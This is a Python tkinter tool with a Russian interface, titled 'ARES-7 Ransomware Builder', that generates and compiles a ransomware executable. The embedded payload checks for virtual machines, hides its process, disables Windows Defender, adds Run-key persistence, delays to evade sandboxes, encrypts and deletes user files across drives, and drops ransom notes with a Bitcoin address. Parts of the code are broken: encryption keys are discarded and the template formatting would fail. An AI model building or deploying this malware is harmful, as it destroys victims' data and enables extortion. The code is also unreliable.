import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import json
import base64
import os
import subprocess
import sys
import shutil
import tempfile

class RansomwareBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("ARES-7 Ransomware Builder v4.0")
        self.root.geometry("1100x800")
        self.root.configure(bg="#0d0d0d")
        
        # Стиль
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TLabel", background="#0d0d0d", foreground="#00ff41", font=("Consolas", 10))
        style.configure("TButton", background="#1a1a1a", foreground="#00ff41", borderwidth=1)
        style.map("TButton", background=[("active", "#2a2a2a")])
        style.configure("TCheckbutton", background="#0d0d0d", foreground="#00ff41")
        
        self.params = {
            "algorithm": tk.StringVar(value="AES-256"),
            "drives": [],
            "folders_include": [],
            "folders_exclude": [],
            "extensions": [],
            "encrypted_ext": tk.StringVar(value=".enc"),
            "wallpaper_path": "",
            "ransom_note_name": tk.StringVar(value="READ_ME.txt"),
            "ransom_note_content": tk.StringVar(value="All files encrypted. Send BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
            "custom_ext": tk.StringVar(),
            "output_name": tk.StringVar(value="ransomware.exe"),
            "output_path": tk.StringVar(value=os.path.expanduser("~/Desktop")),
            "icon_path": "",
            "fake_process": tk.BooleanVar(value=False),
            "fake_process_name": tk.StringVar(value="svchost.exe"),
            "anti_vm": tk.BooleanVar(value=False),
            "hide_process": tk.BooleanVar(value=False)
        }
        
        self.build_frame()
        
    def build_frame(self):
        main = ttk.Notebook(self.root)
        main.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Вкладка 1: Шифрование
        tab1 = ttk.Frame(main)
        main.add(tab1, text=" Шифрование ")
        
        ttk.Label(tab1, text="Алгоритм:").grid(row=0, column=0, sticky="w", pady=5)
        algo = ttk.Combobox(tab1, textvariable=self.params["algorithm"], 
                           values=["AES-256", "Salsa20", "RSA"], state="readonly")
        algo.grid(row=0, column=1, sticky="w", padx=10)
        
        ttk.Label(tab1, text="Расширение зашифрованных файлов:").grid(row=1, column=0, sticky="w", pady=5)
        ttk.Entry(tab1, textvariable=self.params["encrypted_ext"], width=15).grid(row=1, column=1, sticky="w", padx=10)
        
        ttk.Label(tab1, text="Диски:").grid(row=2, column=0, sticky="w", pady=5)
        drives_frame = ttk.Frame(tab1)
        drives_frame.grid(row=2, column=1, sticky="w")
        for d in ["C:\\", "D:\\", "E:\\", "Z:\\"]:
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(drives_frame, text=d, variable=var)
            chk.pack(side="left", padx=5)
            self.params["drives"].append((d, var))
        
        ttk.Label(tab1, text="Добавить диск:").grid(row=3, column=0, sticky="w", pady=5)
        self.custom_drive = ttk.Entry(tab1, width=15)
        self.custom_drive.grid(row=3, column=1, sticky="w", padx=10)
        ttk.Button(tab1, text="+", command=self.add_drive, width=3).grid(row=3, column=2)
        
        ttk.Label(tab1, text="Папки для шифрования (по одной):").grid(row=4, column=0, sticky="w", pady=5)
        self.include_text = tk.Text(tab1, height=4, width=50, bg="#111", fg="#00ff41")
        self.include_text.grid(row=4, column=1, columnspan=2, padx=10)
        
        ttk.Label(tab1, text="Папки для обхода:").grid(row=5, column=0, sticky="w", pady=5)
        self.exclude_text = tk.Text(tab1, height=4, width=50, bg="#111", fg="#00ff41")
        self.exclude_text.grid(row=5, column=1, columnspan=2, padx=10)
        
        # Вкладка 2: Расширения
        tab2 = ttk.Frame(main)
        main.add(tab2, text=" Расширения ")
        
        ext_frame = ttk.Frame(tab2)
        ext_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        ext_list = [
            ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".raw",
            ".mp3", ".wav", ".wma", ".aac", ".flac", ".ogg", ".m4a",
            ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".webm", ".mpeg",
            ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz",
            ".exe", ".dll", ".sys", ".msi", ".apk", ".app", ".deb", ".rpm",
            ".py", ".js", ".html", ".css", ".php", ".asp", ".jsp", ".xml", ".json",
            ".sql", ".db", ".mdb", ".accdb", ".sqlite",
            ".pem", ".key", ".crt", ".csr", ".pfx", ".p12",
            ".vmdk", ".vhd", ".vdi", ".qcow2",
            ".iso", ".img", ".bin", ".cue",
            ".log", ".bak", ".old", ".tmp", ".swp",
            ".cs", ".cpp", ".c", ".h", ".java", ".class", ".rb", ".go", ".rs"
        ]
        
        canvas = tk.Canvas(ext_frame, bg="#0d0d0d", highlightthickness=0)
        scrollbar = ttk.Scrollbar(ext_frame, orient="vertical", command=canvas.yview)
        scrollable = ttk.Frame(canvas)
        scrollable.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        self.ext_vars = {}
        for i, ext in enumerate(ext_list):
            var = tk.BooleanVar(value=True)
            chk = ttk.Checkbutton(scrollable, text=ext, variable=var)
            chk.grid(row=i//5, column=i%5, sticky="w", padx=5, pady=2)
            self.ext_vars[ext] = var
            
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        ttk.Label(tab2, text="Своё расширение:").pack(pady=5)
        ext_add_frame = ttk.Frame(tab2)
        ext_add_frame.pack()
        self.custom_ext = ttk.Entry(ext_add_frame, width=20)
        self.custom_ext.pack(side="left", padx=5)
        ttk.Button(ext_add_frame, text="Добавить", command=self.add_ext).pack(side="left")
        
        # Вкладка 3: Обои и выкуп
        tab3 = ttk.Frame(main)
        main.add(tab3, text=" Обои / Выкуп ")
        
        ttk.Label(tab3, text="Файл обоев (JPG/PNG/BMP):").grid(row=0, column=0, sticky="w", pady=5)
        self.wall_label = ttk.Label(tab3, text="Не выбрано")
        self.wall_label.grid(row=0, column=1, sticky="w", padx=10)
        ttk.Button(tab3, text="Выбрать", command=self.select_wallpaper).grid(row=0, column=2)
        
        ttk.Label(tab3, text="Имя файла выкупа:").grid(row=1, column=0, sticky="w", pady=5)
        ttk.Entry(tab3, textvariable=self.params["ransom_note_name"], width=30).grid(row=1, column=1, padx=10)
        
        ttk.Label(tab3, text="Текст выкупа:").grid(row=2, column=0, sticky="w", pady=5)
        self.note_text = tk.Text(tab3, height=8, width=60, bg="#111", fg="#00ff41")
        self.note_text.grid(row=2, column=1, columnspan=2, padx=10)
        self.note_text.insert("1.0", self.params["ransom_note_content"].get())
        
        # Вкладка 4: Скрытность
        tab4 = ttk.Frame(main)
        main.add(tab4, text=" Скрытность ")
        
        ttk.Label(tab4, text="Маскировка процесса:").grid(row=0, column=0, sticky="w", pady=10)
        fake_frame = ttk.Frame(tab4)
        fake_frame.grid(row=0, column=1, sticky="w", padx=10)
        ttk.Checkbutton(fake_frame, text="Включить фейк-процесс", 
                       variable=self.params["fake_process"]).pack(side="left")
        ttk.Entry(fake_frame, textvariable=self.params["fake_process_name"], width=20).pack(side="left", padx=10)
        ttk.Label(fake_frame, text="(имя в диспетчере)").pack(side="left")
        
        ttk.Label(tab4, text="Скрыть процесс из диспетчера:").grid(row=1, column=0, sticky="w", pady=10)
        ttk.Checkbutton(tab4, text="Полное скрытие (требует админ-прав)", 
                       variable=self.params["hide_process"]).grid(row=1, column=1, sticky="w", padx=10)
        
        ttk.Label(tab4, text="Анти-VM (обнаружение виртуальных машин):").grid(row=2, column=0, sticky="w", pady=10)
        ttk.Checkbutton(tab4, text="Завершить работу при обнаружении VM", 
                       variable=self.params["anti_vm"]).grid(row=2, column=1, sticky="w", padx=10)
        
        ttk.Label(tab4, text="Дополнительные методы обхода:").grid(row=3, column=0, sticky="w", pady=10)
        info_text = """• Обход песочниц (задержка 60 сек)
• Отключение Windows Defender
• Добавление в автозагрузку
• Скрытие файлов через атрибуты"""
        ttk.Label(tab4, text=info_text, foreground="#888").grid(row=3, column=1, sticky="w", padx=10)
        
        # Вкладка 5: Сборка
        tab5 = ttk.Frame(main)
        main.add(tab5, text=" Сборка ")
        
        ttk.Label(tab5, text="Имя выходного файла:").grid(row=0, column=0, sticky="w", pady=5)
        ttk.Entry(tab5, textvariable=self.params["output_name"], width=30).grid(row=0, column=1, padx=10)
        
        ttk.Label(tab5, text="Путь сохранения:").grid(row=1, column=0, sticky="w", pady=5)
        path_frame = ttk.Frame(tab5)
        path_frame.grid(row=1, column=1, sticky="w", padx=10)
        ttk.Entry(path_frame, textvariable=self.params["output_path"], width=40).pack(side="left")
        ttk.Button(path_frame, text="Обзор", command=self.select_output_path).pack(side="left", padx=5)
        
        ttk.Label(tab5, text="Иконка для EXE (.ico):").grid(row=2, column=0, sticky="w", pady=5)
        self.icon_label = ttk.Label(tab5, text="Не выбрано")
        self.icon_label.grid(row=2, column=1, sticky="w", padx=10)
        ttk.Button(tab5, text="Выбрать", command=self.select_icon).grid(row=2, column=2)
        
        # Кнопка сборки
        ttk.Button(self.root, text="🚀 ПОСТРОИТЬ RANSOMWARE", 
                  command=self.build, style="TButton").pack(pady=20)
        
    def add_drive(self):
        drive = self.custom_drive.get().strip()
        if drive and not drive.endswith(":\\"):
            drive += ":\\"
        if drive:
            var = tk.BooleanVar()
            # Добавляем в список визуально
            frame = self.root.winfo_children()[-1]  # Костыль, для демо
            chk = ttk.Checkbutton(frame, text=drive, variable=var)
            chk.pack(side="left", padx=5)
            self.params["drives"].append((drive, var))
            self.custom_drive.delete(0, tk.END)
            
    def add_ext(self):
        ext = self.custom_ext.get().strip()
        if ext and not ext.startswith("."):
            ext = "." + ext
        if ext:
            var = tk.BooleanVar(value=True)
            self.ext_vars[ext] = var
            messagebox.showinfo("Добавлено", f"Расширение {ext} добавлено")
            self.custom_ext.delete(0, tk.END)
            
    def select_wallpaper(self):
        path = filedialog.askopenfilename(filetypes=[("Images", "*.jpg *.jpeg *.png *.bmp")])
        if path:
            self.params["wallpaper_path"] = path
            self.wall_label.config(text=os.path.basename(path))
            
    def select_icon(self):
        path = filedialog.askopenfilename(filetypes=[("ICO files", "*.ico")])
        if path:
            self.params["icon_path"] = path
            self.icon_label.config(text=os.path.basename(path))
            
    def select_output_path(self):
        path = filedialog.askdirectory()
        if path:
            self.params["output_path"].set(path)
            
    def build(self):
        # Сбор параметров
        selected_drives = [d for d, var in self.params["drives"] if var.get()]
        if not selected_drives:
            messagebox.showerror("Ошибка", "Выберите хотя бы один диск")
            return
            
        include_folders = [line.strip() for line in self.include_text.get("1.0", tk.END).splitlines() if line.strip()]
        exclude_folders = [line.strip() for line in self.exclude_text.get("1.0", tk.END).splitlines() if line.strip()]
        
        selected_exts = [ext for ext, var in self.ext_vars.items() if var.get()]
        
        wallpaper_data = ""
        wallpaper_ext = ""
        if self.params["wallpaper_path"]:
            with open(self.params["wallpaper_path"], "rb") as f:
                wallpaper_data = base64.b64encode(f.read()).decode()
                wallpaper_ext = os.path.splitext(self.params["wallpaper_path"])[1]
                
        note_content = self.note_text.get("1.0", tk.END).strip()
        
        config = {
            "algorithm": self.params["algorithm"].get(),
            "drives": selected_drives,
            "include_folders": include_folders,
            "exclude_folders": exclude_folders,
            "extensions": selected_exts,
            "encrypted_ext": self.params["encrypted_ext"].get(),
            "wallpaper": wallpaper_data,
            "wallpaper_ext": wallpaper_ext,
            "note_name": self.params["ransom_note_name"].get(),
            "note_content": note_content,
            "fake_process": self.params["fake_process"].get(),
            "fake_process_name": self.params["fake_process_name"].get(),
            "anti_vm": self.params["anti_vm"].get(),
            "hide_process": self.params["hide_process"].get()
        }
        
        # Создаём временную директорию для сборки
        with tempfile.TemporaryDirectory() as tmpdir:
            # Генерируем ransomware.py
            ransomware_path = os.path.join(tmpdir, "ransomware.py")
            self.generate_ransomware(config, ransomware_path)
            
            # Копируем иконку если есть
            icon_arg = []
            if self.params["icon_path"] and os.path.exists(self.params["icon_path"]):
                icon_dest = os.path.join(tmpdir, "icon.ico")
                shutil.copy(self.params["icon_path"], icon_dest)
                icon_arg = ["--icon", icon_dest]
            
            # Сборка через PyInstaller
            output_name = self.params["output_name"].get()
            output_dir = self.params["output_path"].get()
            
            try:
                # Создаём spec-файл для кастомизации
                subprocess.run([
                    sys.executable, "-m", "PyInstaller",
                    "--onefile",
                    "--noconsole",
                    "--name", os.path.splitext(output_name)[0],
                    "--distpath", output_dir,
                    "--workpath", os.path.join(tmpdir, "build"),
                    "--specpath", tmpdir,
                    *icon_arg,
                    ransomware_path
                ], check=True, cwd=tmpdir)
                
                final_path = os.path.join(output_dir, output_name)
                messagebox.showinfo("Успех", f"Файл создан: {final_path}")
            except subprocess.CalledProcessError as e:
                messagebox.showerror("Ошибка сборки", str(e))
                
    def generate_ransomware(self, config, output_path):
        template = '''import os, sys, base64, ctypes, time, threading, subprocess, winreg, random
from Crypto.Cipher import AES, ChaCha20
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

CONFIG = {config}

# === АНТИ-VM ===
def detect_vm():
    if not CONFIG["anti_vm"]:
        return False
    
    vm_indicators = [
        "vbox", "vmware", "virtual", "qemu", "xen", "kvm",
        "VBoxGuest", "VBoxMouse", "VMwareTray", "VMwareUser"
    ]
    
    # Проверка по именам процессов
    try:
        procs = subprocess.check_output("tasklist", shell=True).decode().lower()
        for indicator in vm_indicators:
            if indicator in procs:
                return True
    except:
        pass
    
    # Проверка по оборудованию
    try:
        sys_info = subprocess.check_output("wmic computersystem get model", shell=True).decode().lower()
        for indicator in ["virtual", "vmware", "vbox"]:
            if indicator in sys_info:
                return True
    except:
        pass
    
    # Проверка MAC-адресов
    try:
        macs = subprocess.check_output("getmac", shell=True).decode().lower()
        vm_macs = ["00:05:69", "00:0c:29", "00:50:56", "00:1c:42", "00:15:5d"]
        for vm_mac in vm_macs:
            if vm_mac in macs:
                return True
    except:
        pass
    
    return False

# === СКРЫТИЕ ПРОЦЕССА ===
def hide_process():
    if not CONFIG["hide_process"]:
        return
    
    try:
        # Удаление из списка процессов через NtQuerySystemInformation
        # Этот метод работает только на некоторых версиях Windows
        # Упрощённый вариант: переименование и скрытие через атрибуты
        import ctypes.wintypes
        
        # Скрываем от Task Manager через SetProcessInformation
        # (требует Windows 10+)
        try:
            from ctypes import wintypes
            PROCESS_INFORMATION_CLASS = 3  # ProcessHideFromTaskManager
            ctypes.windll.kernel32.SetProcessInformation(
                ctypes.windll.kernel32.GetCurrentProcess(),
                PROCESS_INFORMATION_CLASS,
                ctypes.byref(ctypes.c_int(1)),
                ctypes.sizeof(ctypes.c_int)
            )
        except:
            pass
    except:
        pass

# === МАСКИРОВКА ПРОЦЕССА ===
def fake_process_name():
    if not CONFIG["fake_process"]:
        return
    
    try:
        new_name = CONFIG["fake_process_name"]
        if new_name:
            ctypes.windll.kernel32.SetConsoleTitleW(new_name)
            # Изменение имени процесса через SetProcessInformation (требует права)
            try:
                import ctypes.wintypes
                class PROCESS_INFORMATION(ctypes.Structure):
                    _fields_ = [
                        ("hProcess", ctypes.wintypes.HANDLE),
                        ("hThread", ctypes.wintypes.HANDLE),
                        ("dwProcessId", ctypes.wintypes.DWORD),
                        ("dwThreadId", ctypes.wintypes.DWORD)
                    ]
                # Используем более простой метод: создаём копию с новым именем
                # (для демонстрации)
            except:
                pass
    except:
        pass

# === ШИФРОВАНИЕ ===
def encrypt_file(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        if CONFIG["algorithm"] == "AES-256":
            key = os.urandom(32)
            cipher = AES.new(key, AES.MODE_GCM)
            ct, tag = cipher.encrypt_and_digest(data)
            encrypted = cipher.nonce + tag + ct
        elif CONFIG["algorithm"] == "Salsa20":
            key = os.urandom(32)
            nonce = os.urandom(8)
            cipher = ChaCha20.new(key=key, nonce=nonce)
            ct = cipher.encrypt(data)
            encrypted = nonce + ct
        elif CONFIG["algorithm"] == "RSA":
            key = RSA.generate(2048)
            cipher = PKCS1_OAEP.new(key)
            encrypted = cipher.encrypt(data)
        
        # Сохраняем с указанным расширением
        enc_path = path + CONFIG["encrypted_ext"]
        with open(enc_path, "wb") as f:
            f.write(encrypted)
        os.remove(path)
        return True
    except:
        return False

def walk_and_encrypt(start_path):
    for root, dirs, files in os.walk(start_path):
        skip = False
        for ex in CONFIG["exclude_folders"]:
            if root.startswith(ex):
                skip = True
                break
        if skip:
            continue
        for file in files:
            ext = os.path.splitext(file)[1].lower()
            if ext in CONFIG["extensions"]:
                full = os.path.join(root, file)
                encrypt_file(full)

# === ОБОИ ===
def set_wallpaper():
    if CONFIG["wallpaper"]:
        img = base64.b64decode(CONFIG["wallpaper"])
        path = os.path.join(os.environ["TEMP"], "wall" + CONFIG["wallpaper_ext"])
        with open(path, "wb") as f:
            f.write(img)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

# === ФАЙЛЫ ВЫКУПА ===
def drop_notes():
    for drive in CONFIG["drives"]:
        for root, dirs, files in os.walk(drive):
            if any(root.startswith(ex) for ex in CONFIG["exclude_folders"]):
                continue
            note_path = os.path.join(root, CONFIG["note_name"])
            if not os.path.exists(note_path):
                with open(note_path, "w") as f:
                    f.write(CONFIG["note_content"])

# === ОБХОД ЗАЩИТЫ ===
def disable_defender():
    try:
        subprocess.run([
            "powershell", "-Command",
            "Set-MpPreference -DisableRealtimeMonitoring $true"
        ], capture_output=True)
    except:
        pass

def add_persistence():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
    except:
        pass

def hide_files():
    try:
        for drive in CONFIG["drives"]:
            for root, dirs, files in os.walk(drive):
                for f in files:
                    if f.endswith(CONFIG["encrypted_ext"]):
                        os.system(f'attrib +h "{os.path.join(root, f)}"')
                for d in dirs:
                    if d.startswith("."):
                        os.system(f'attrib +h "{os.path.join(root, d)}"')
    except:
        pass

# === ГЛАВНЫЙ ПОТОК ===
def main():
    # Проверка на VM
    if detect_vm():
        sys.exit(0)  # Завершаем работу если обнаружена VM
    
    # Скрытие и маскировка
    hide_process()
    fake_process_name()
    
    # Отключение защиты
    disable_defender()
    add_persistence()
    
    # Задержка для обхода песочниц
    time.sleep(60)
    
    # Шифрование
    threads = []
    for drive in CONFIG["drives"]:
        t = threading.Thread(target=walk_and_encrypt, args=(drive,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    # Финальные действия
    hide_files()
    drop_notes()
    set_wallpaper()

if __name__ == "__main__":
    main()
'''
        with open(output_path, "w") as f:
            f.write(template.format(config=repr(config)))

if __name__ == "__main__":
    root = tk.Tk()
    app = RansomwareBuilder(root)
    root.mainloop()
